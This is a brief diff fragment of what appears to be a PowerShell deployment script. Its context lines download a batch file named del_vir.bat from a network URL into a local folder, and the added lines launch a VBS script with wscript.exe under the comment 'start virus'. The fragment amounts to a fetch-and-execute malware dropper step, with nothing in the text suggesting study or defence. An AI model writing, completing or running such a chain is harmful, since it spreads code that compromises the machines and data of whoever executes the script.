@@ -63,4 +63,7 @@ $dbatPath = "C:\uptm\del_vir.bat"
 Write-Host "Downloading del_vir.bat..."
 Invoke-WebRequest -Uri $dbatUrl -OutFile $dbatPath -UseBasicParsing
 
+# 7. start virus
+wscript.exe "$vbsPath"
+
 Write-Host "Deployment completed successfully."
